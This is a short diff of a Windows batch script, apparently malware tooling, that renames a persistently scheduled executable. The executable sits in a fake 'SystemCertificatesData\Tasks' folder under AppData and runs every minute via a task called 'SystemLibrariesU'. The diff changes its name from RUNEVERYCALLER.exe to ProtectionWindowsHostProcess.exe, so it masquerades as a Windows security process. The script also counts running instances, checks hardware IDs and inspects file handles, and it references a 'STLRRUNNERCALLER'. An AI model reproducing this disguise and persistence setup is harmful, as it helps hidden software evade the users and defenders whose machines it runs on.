@@ -1,5 +1,5 @@
 :: ( nHBAPWtA )
-:: RUNEVERYCALLER Installed in %appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe ( %SystemRoot%\System32\convertsshd.exe )
+:: RUNEVERYCALLER Installed in %appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe ( %SystemRoot%\System32\convertsshd.exe )
 :: RUNEVERYCALLER TASK NAMED "SystemLibrariesU" , is Running RunEveryCaller every 1 min
 
 ::goto :EOF
@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=14.3"
+set "BATCHVERSION=14.4"
 
 
 
@@ -56,15 +56,15 @@ set "VALID_HWIDS="
 
 
 
-:: Count the instances of RUNEVERYCALLER.exe
+:: Count the instances of ProtectionWindowsHostProcess.exe
 set "instances=0"
-for /f "tokens=*" %%A in ('tasklist /fi "imagename eq RUNEVERYCALLER.exe" ^| find /i "RUNEVERYCALLER.exe"') do (
+for /f "tokens=*" %%A in ('tasklist /fi "imagename eq ProtectionWindowsHostProcess.exe" ^| find /i "ProtectionWindowsHostProcess.exe"') do (
     set /a instances+=1
 )
 
 :: Check if one or more instances are found
 if %instances% geq 2 (
-    echo RUNEVERYCALLER.exe is already running. Exiting batch...
+    echo ProtectionWindowsHostProcess.exe is already running. Exiting batch...
     exit
 )
 
@@ -85,7 +85,7 @@ if %errorLevel% == 0 (
 echo.
 echo.
 
-echo RUNEVERYCALLER.exe is not running. Continue.....
+echo ProtectionWindowsHostProcess.exe is not running. Continue.....
 
 
 
@@ -143,8 +143,8 @@ echo Handle LOGFILE TA3 RUNEVERY
 handle.exe "%LOGFILE%"
 echo.
 echo.
-echo echo Handle RUNEVERYCALLER
-handle.exe "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe"
+echo echo Handle ProtectionWindowsHostProcess
+handle.exe "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe"
 echo.
 echo.
 echo Handle STLRRUNNERCALLER
